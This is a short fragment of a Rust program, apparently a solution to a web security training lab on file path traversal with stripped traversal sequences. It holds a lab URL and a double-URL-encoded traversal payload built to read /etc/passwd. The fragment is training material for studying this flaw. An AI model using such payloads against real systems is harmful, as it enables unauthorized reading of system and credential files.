/**********************************************************************
*
* Lab: File path traversal, traversal sequences stripped with
...
const LAB_URL: &str = "https://0afa00080470838586337f4f00be0031.web-security-academy.net";
...
fn main() {
    ...
    let payload = "..%252f..%252f..%252fetc/passwd";
